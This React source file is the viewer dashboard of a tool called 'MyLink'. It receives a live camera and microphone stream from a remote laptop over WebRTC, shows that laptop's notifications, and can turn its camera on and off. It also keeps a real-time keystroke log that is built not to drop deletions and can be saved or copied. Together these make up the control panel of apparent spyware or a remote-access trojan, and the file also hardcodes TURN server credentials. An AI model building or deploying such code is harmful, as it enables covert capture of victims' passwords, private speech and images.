'use client'

import { useState, useEffect, useRef } from 'react'

// Removed Tab type - using single page layout

interface Notification {
    id: number
    title: string
    body: string
    time: string
}

export default function Dashboard() {
    const [connected, setConnected] = useState(false)
    const [senderOnline, setSenderOnline] = useState(false)
    const [fps, setFps] = useState(0)
    const [keyboardLog, setKeyboardLog] = useState<string>('')
    const [streamActive, setStreamActive] = useState(false)
    // Removed activeTab state - using single page layout
    const [notifications, setNotifications] = useState<Notification[]>([])
    const [cameraEnabled, setCameraEnabled] = useState(true) // Camera control

    const wsRef = useRef<WebSocket | null>(null)
    const pcRef = useRef<RTCPeerConnection | null>(null)
    const videoRef = useRef<HTMLVideoElement>(null)
    const audioRef = useRef<HTMLAudioElement>(null)
    const clientIdRef = useRef<string>(`viewer-${Date.now()}`) // Consistent viewer ID
    const userInteractedRef = useRef<boolean>(false) // Track user interaction for autoplay
    const pendingPlayRef = useRef<{ video: boolean, audio: boolean }>({ video: false, audio: false }) // Track pending play calls

    // Detect user interaction to enable autoplay
    useEffect(() => {
        const enableAutoplay = () => {
            if (!userInteractedRef.current) {
                userInteractedRef.current = true
                console.log('✅ User interaction detected - autoplay enabled')

                // Remove click-to-play message if exists
                const message = document.querySelector('.click-to-play-message')
                if (message) {
                    message.remove()
                }

                // Try to play pending streams
                if (pendingPlayRef.current.video && videoRef.current) {
                    videoRef.current.play().catch(e => console.error('Pending video play error:', e))
                }
                if (pendingPlayRef.current.audio && audioRef.current) {
                    audioRef.current.play().catch(e => console.error('Pending audio play error:', e))
                }
            }
        }

        // Listen for any user interaction
        const events = ['click', 'touchstart', 'keydown']
        events.forEach(event => {
            document.addEventListener(event, enableAutoplay, { once: true, passive: true })
        })

        return () => {
            events.forEach(event => {
                document.removeEventListener(event, enableAutoplay)
            })
        }
    }, [])

    useEffect(() => {
        connectWebSocket()
        return () => {
            if (wsRef.current) wsRef.current.close()
            if (pcRef.current) pcRef.current.close()
        }
    }, [])

    const connectWebSocket = () => {
        const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || 'wss://mylink.slowrox.com/ws'
        const clientId = clientIdRef.current // Use consistent ID
        const ws = new WebSocket(`${backendUrl}/${clientId}/receiver`)

        ws.onopen = () => {
            console.log('✅ Connected to backend')
            setConnected(true)
        }

        ws.onmessage = async (event) => {
            try {
                const message = JSON.parse(event.data)
                await handleMessage(message)
            } catch (error) {
                console.error('Message parse error:', error)
            }
        }

        ws.onclose = () => {
            console.log('❌ Disconnected from backend')
            setConnected(false)
            setStreamActive(false)
            setTimeout(connectWebSocket, 5000)
        }

        wsRef.current = ws
    }

    // Send camera control command
    const sendCameraControl = (enabled: boolean) => {
        if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
            wsRef.current.send(JSON.stringify({
                type: 'camera-control',
                enabled: enabled
            }))
            setCameraEnabled(enabled)
            console.log(`📹 Camera ${enabled ? 'enabled' : 'disabled'}`)
        }
    }

    const createPeerConnection = () => {
        if (pcRef.current) return pcRef.current

        const pc = new RTCPeerConnection({
            iceServers: [
                // Google STUN servers (free, for NAT detection)
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' },

                // MyLink TURN server (for relay when direct connection fails)
                // Enables access from different WiFi and mobile data
                {
                    urls: [
                        'turns:mylink.slowrox.com:5349',               // TLS (Port 5349 - Standard Secure)
                        'turn:mylink.slowrox.com:3478?transport=tcp',  // TCP (Port 3478 - Fallback)
                        'turn:mylink.slowrox.com:3478'                 // UDP (Port 3478 - Standard)
                    ],
                    username: 'mylink',
                    credential: 'MyL1nk@TURN2025!'
                }
            ],
            // iceTransportPolicy: 'relay', // REMOVED to allow STUN/Direct connections
            iceCandidatePoolSize: 10
        })



        pc.oniceconnectionstatechange = () => {
            console.log("🧊 ICE Connection State:", pc.iceConnectionState);
            if (pc.iceConnectionState === 'failed') {
                console.error("❌ ICE Connection FAILED - Restarting ICE...");
                pc.restartIce();
            }
        };


        // Real FPS calculation
        let frameCount = 0
        let lastTime = Date.now()
        const fpsInterval = setInterval(() => {
            if (pcRef.current && pcRef.current.connectionState === 'connected') {
                const now = Date.now()
                const elapsed = now - lastTime
                if (elapsed >= 1000) {
                    setFps(Math.round((frameCount * 1000) / elapsed))
                    frameCount = 0
                    lastTime = now
                }
            } else {
                setFps(0)
            }
        }, 1000)

        pc.onicecandidate = (event) => {
            if (event.candidate && wsRef.current) {
                wsRef.current.send(JSON.stringify({
                    type: 'ice-candidate',
                    candidate: {
                        candidate: event.candidate.candidate,
                        sdpMLineIndex: event.candidate.sdpMLineIndex,
                        sdpMid: event.candidate.sdpMid
                    },
                    target: 'laptop-sender',
                    sender_id: clientIdRef.current // Use consistent ID
                }))
            }
        }

        // Track video frames for FPS calculation
        pc.ontrack = (event) => {
            console.log('🎥 Received Remote Stream', event.track.kind)
            let stream = event.streams[0]
            if (!stream) {
                console.log('⚠️ No stream found in event, creating new MediaStream')
                stream = new MediaStream()
                stream.addTrack(event.track)
            }

            // Handle video track separately
            if (event.track.kind === 'video' && videoRef.current) {
                videoRef.current.srcObject = stream
                console.log('📹 Video track assigned to video element')

                // Manually call play() to handle autoplay policy
                videoRef.current.addEventListener('loadedmetadata', async () => {
                    // Count frames for FPS using video element
                    let lastFrameTime = performance.now()
                    const countFrame = () => {
                        const now = performance.now()
                        if (now - lastFrameTime >= 100) {
                            frameCount++
                            lastFrameTime = now
                        }
                        if (videoRef.current && !videoRef.current.paused) {
                            requestAnimationFrame(countFrame)
                        }
                    }

                    // Try to play - only if user has interacted
                    if (userInteractedRef.current) {
                        try {
                            await videoRef.current!.play()
                            console.log('✅ Video playing successfully')
                            countFrame()
                            setStreamActive(true)
                        } catch (error) {
                            console.error('❌ Video play error:', error)
                            pendingPlayRef.current.video = true
                        }
                    } else {
                        // User hasn't interacted yet - mark as pending
                        console.log('⏳ Video ready, waiting for user interaction...')
                        pendingPlayRef.current.video = true

                        // Show click-to-play message
                        const videoElement = videoRef.current
                        if (videoElement && videoElement.parentElement) {
                            // Remove existing message if any
                            const existingMessage = videoElement.parentElement.querySelector('.click-to-play-message')
                            if (existingMessage) {
                                existingMessage.remove()
                            }

                            const message = document.createElement('div')
                            message.className = 'click-to-play-message absolute inset-0 flex items-center justify-center bg-black/50 text-white text-lg cursor-pointer z-10'
                            message.textContent = 'Click anywhere to start stream'
                            message.onclick = async () => {
                                userInteractedRef.current = true
                                try {
                                    await videoElement.play()
                                    console.log('✅ Video playing after user click')
                                    countFrame()
                                    message.remove()
                                } catch (error) {
                                    console.error('❌ Video play error after click:', error)
                                }
                            }
                            videoElement.parentElement.appendChild(message)
                        }
                    }
                })

                // Log playing event
                videoRef.current.addEventListener('playing', () => {
                    console.log('▶️ Video is playing')
                    setStreamActive(true)
                })
            }

            // Handle audio track separately
            if (event.track.kind === 'audio' && audioRef.current) {
                audioRef.current.srcObject = stream
                console.log('🔊 Audio track assigned to audio element')

                // Manually call play() for audio
                audioRef.current.addEventListener('loadedmetadata', async () => {
                    // Try to play - only if user has interacted
                    if (userInteractedRef.current) {
                        try {
                            await audioRef.current!.play()
                            console.log('✅ Audio playing successfully')
                        } catch (error) {
                            console.error('❌ Audio play error:', error)
                            pendingPlayRef.current.audio = true
                        }
                    } else {
                        // User hasn't interacted yet - mark as pending
                        console.log('⏳ Audio ready, waiting for user interaction...')
                        pendingPlayRef.current.audio = true
                    }
                })
            }
        }

        pcRef.current = pc
        return pc
    }

    const handleMessage = async (message: any) => {
        const { type } = message

        switch (type) {
            case 'status':
                // Backend connection summary (senders/receivers)
                setSenderOnline((message.senders || 0) > 0)
                break

            case 'sender-status':
                // Explicit laptop online/offline notifications
                setSenderOnline(message.status === 'online')
                setNotifications(prev => [{
                    id: Date.now(),
                    title: 'Laptop Status',
                    body: message.status === 'online' ? 'Laptop is now active.' : 'Laptop is offline.',
                    time: new Date().toLocaleTimeString()
                }, ...prev].slice(0, 50))
                break

            case 'quality-stats':
                // Any quality-stats implies an active stream from sender
                setStreamActive(true)
                break

            case 'offer':
                const pc = createPeerConnection()
                await pc.setRemoteDescription(new RTCSessionDescription({
                    type: 'offer',
                    sdp: message.sdp
                }))

                const answer = await pc.createAnswer()
                await pc.setLocalDescription(answer)

                wsRef.current?.send(JSON.stringify({
                    type: 'answer',
                    target: message.sender_id,
                    sdp: answer.sdp,
                    sender_id: clientIdRef.current // Use consistent ID
                }))
                break

            case 'ice-candidate':
                if (pcRef.current && message.candidate) {
                    try {
                        const candidate = new RTCIceCandidate({
                            candidate: message.candidate.candidate,
                            sdpMLineIndex: message.candidate.sdpMLineIndex,
                            sdpMid: message.candidate.sdpMid
                        })
                        await pcRef.current.addIceCandidate(candidate)
                    } catch (e) {
                        console.error('Error adding ICE candidate', e)
                    }
                }
                break

            case 'keylog-history':
                setKeyboardLog(message.history)
                break

            case 'keyboard-event':
                setKeyboardLog(prev => {
                    // Use formatted if available, otherwise fallback to raw logic
                    if (message.formatted) return prev + message.formatted

                    // Fallback logic (modified to NOT delete on backspace)
                    if (message.key === 'Key.space') return prev + ' '
                    if (message.key === 'Key.enter') return prev + '\n'
                    if (message.key === 'Key.backspace') return prev + ' [BSP] ' // Don't delete!
                    if (message.key.startsWith('Key.')) return prev + ` [${message.key.slice(4).toUpperCase()}] `
                    return prev + message.key
                })
                break

            case 'notification':
                setNotifications(prev => [{
                    id: Date.now(),
                    title: message.title || 'Notification',
                    body: message.body || '',
                    time: new Date().toLocaleTimeString()
                }, ...prev].slice(0, 50))
                break
        }
    }

    const clearKeyboardLog = () => {
        setKeyboardLog('')
        if (wsRef.current) {
            wsRef.current.send(JSON.stringify({
                type: 'clear-keylog',
                target: 'laptop-sender',
                sender_id: clientIdRef.current
            }))
        }
    }
    const copyKeyboardLog = () => navigator.clipboard.writeText(keyboardLog)
    const saveKeyboardLog = () => {
        const blob = new Blob([keyboardLog], { type: 'text/plain' })
        const url = URL.createObjectURL(blob)
        const a = document.createElement('a')
        a.href = url
        a.download = `keyboard-log-${Date.now()}.txt`
        a.click()
        URL.revokeObjectURL(url)
    }

    const clearNotifications = () => setNotifications([])


    return (
        <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-950 to-black text-white">
            <header className="border-b border-gray-800 bg-gray-900/50 backdrop-blur-xl sticky top-0 z-50">
                <div className="container mx-auto px-6 py-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <div className={`w-3 h-3 rounded-full ${connected ? 'bg-green-500' : 'bg-red-500'} animate-pulse`} />
                            <div>
                                <h1 className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
                                    MyLink <span className="text-xs border border-blue-500/30 px-2 py-0.5 rounded text-blue-400 ml-2">PRO 60FPS</span>
                                </h1>
                                <p className="text-sm text-gray-400">
                                    {connected
                                        ? senderOnline
                                            ? 'Connected • Laptop active'
                                            : 'Connected • Waiting for laptop sender...'
                                        : 'Connecting...'}
                                </p>
                            </div>
                        </div>

                        <div className="text-right">
                            <div className="text-2xl font-bold text-green-400">{fps} FPS</div>
                            <div className="text-xs text-gray-500">HD Stream</div>
                        </div>
                    </div>


                </div>
            </header>

            <main className="container mx-auto px-6 py-8 space-y-6">
                {/* Video + Audio Section - Always visible */}
                <section className="bg-gray-900/50 backdrop-blur-xl rounded-2xl border border-gray-800 overflow-hidden shadow-2xl">
                    <div className="p-4 border-b border-gray-800 flex justify-between items-center">
                        <div className="flex items-center gap-4">
                            <h2 className="text-lg font-semibold">
                                📹 Live Video + Audio
                            </h2>
                            {/* LIVE Indicator Box */}
                            {streamActive && (
                                <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-red-500/20 border border-red-500/50">
                                    <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                                    <span className="text-xs font-semibold text-red-400">LIVE</span>
                                </div>
                            )}
                        </div>
                        {/* Camera Control Button */}
                        <button
                            onClick={() => sendCameraControl(!cameraEnabled)}
                            className={`px-6 py-3 rounded-lg font-medium transition-all min-h-[44px] ${cameraEnabled
                                ? 'bg-green-500/20 text-green-400 hover:bg-green-500/30 active:bg-green-500/40 border border-green-500/50'
                                : 'bg-gray-700/50 text-gray-400 hover:bg-gray-700 active:bg-gray-600 border border-gray-600'
                                }`}
                        >
                            {cameraEnabled ? '📹 Camera ON' : '📹 Camera OFF'}
                        </button>
                    </div>
                    <div className="aspect-video bg-black flex items-center justify-center relative w-full max-w-full overflow-hidden">
                        {/* Video element - hidden when camera OFF */}
                        <video
                            ref={videoRef}
                            autoPlay
                            playsInline
                            muted
                            className={`w-full h-full object-contain ${!cameraEnabled ? 'hidden' : ''}`}
                        />

                        {/* Audio-only mode indicator (when camera OFF but stream active) */}
                        {!cameraEnabled && streamActive && (
                            <div className="absolute inset-0 flex flex-col items-center justify-center bg-black">
                                <div className="text-6xl mb-4">🎤</div>
                                <div className="text-2xl font-semibold text-gray-300 mb-2">Audio Only</div>
                                <div className="text-sm text-gray-500 mb-6">Camera is turned off</div>
                                {/* Audio waveform animation */}
                                <div className="flex gap-2">
                                    {[...Array(5)].map((_, i) => (
                                        <div
                                            key={i}
                                            className="w-2 bg-green-500 rounded-full animate-pulse"
                                            style={{
                                                height: `${20 + (i % 2) * 20}px`,
                                                animationDelay: `${i * 0.15}s`,
                                                animationDuration: '1s'
                                            }}
                                        />
                                    ))}
                                </div>
                            </div>
                        )}

                        {/* Waiting for stream message */}
                        {!streamActive && (
                            <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/80 backdrop-blur-sm">
                                <div className="text-6xl mb-4 animate-bounce">📡</div>
                                <div className="text-xl font-semibold text-gray-300">Waiting for Stream...</div>
                                <div className="text-sm text-gray-500 mt-2">Check if laptop is running</div>
                            </div>
                        )}
                    </div>

                    {/* Audio element - always present for audio playback */}
                    <audio ref={audioRef} autoPlay className="hidden" />
                </section>

                {/* Keyboard Logs Section - Always visible */}
                <section className="bg-gray-900/50 backdrop-blur-xl rounded-2xl border border-gray-800 overflow-hidden h-[600px] flex flex-col shadow-xl">
                    <div className="p-4 border-b border-gray-800">
                        <h2 className="text-lg font-semibold">⌨️ Real-time Keystrokes</h2>
                    </div>

                    <div className="flex-1 p-4 overflow-auto bg-gray-950/30">
                        <textarea
                            value={keyboardLog}
                            readOnly
                            className="w-full h-full bg-transparent font-mono text-sm resize-none focus:outline-none text-green-400/80"
                            placeholder="Listening for input..."
                        />
                    </div>

                    <div className="p-4 border-t border-gray-800 flex gap-2 bg-gray-900/50">
                        <button onClick={saveKeyboardLog} className="flex-1 px-3 py-2 bg-blue-600/20 hover:bg-blue-600/40 text-blue-400 rounded-lg text-sm transition border border-blue-500/30">
                            💾 Save
                        </button>
                        <button onClick={copyKeyboardLog} className="flex-1 px-3 py-2 bg-gray-700/20 hover:bg-gray-700/40 text-gray-300 rounded-lg text-sm transition border border-gray-600/30">
                            📋 Copy
                        </button>
                        <button onClick={clearKeyboardLog} className="flex-1 px-3 py-2 bg-red-600/20 hover:bg-red-600/40 text-red-400 rounded-lg text-sm transition border border-red-500/30">
                            🗑️ Clear
                        </button>
                    </div>
                </section>

                {/* Notifications Section - Always visible */}
                <section className="bg-gray-900/50 backdrop-blur-xl rounded-2xl border border-gray-800 overflow-hidden shadow-xl">
                    <div className="p-4 border-b border-gray-800 flex justify-between items-center">
                        <h2 className="text-lg font-semibold">🔔 Notifications</h2>
                        {notifications.length > 0 && (
                            <button onClick={clearNotifications} className="px-3 py-1 bg-red-600/20 hover:bg-red-600/40 text-red-400 rounded-lg text-sm transition border border-red-500/30">
                                Clear All
                            </button>
                        )}
                    </div>

                    <div className="p-4 space-y-3 max-h-[600px] overflow-y-auto">
                        {notifications.length === 0 ? (
                            <div className="text-center py-12">
                                <div className="text-6xl mb-4">🔕</div>
                                <div className="text-xl font-semibold text-gray-400">No Notifications</div>
                                <div className="text-sm text-gray-500 mt-2">Notifications from laptop will appear here</div>
                            </div>
                        ) : (
                            notifications.map(notif => (
                                <div key={notif.id} className="bg-gray-800/50 rounded-lg p-4 border border-gray-700 hover:border-gray-600 transition">
                                    <div className="flex justify-between items-start mb-2">
                                        <h3 className="font-semibold text-white">{notif.title}</h3>
                                        <span className="text-xs text-gray-500">{notif.time}</span>
                                    </div>
                                    <p className="text-sm text-gray-400">{notif.body}</p>
                                </div>
                            ))
                        )}
                    </div>
                </section>
            </main>
        </div>
    )
}
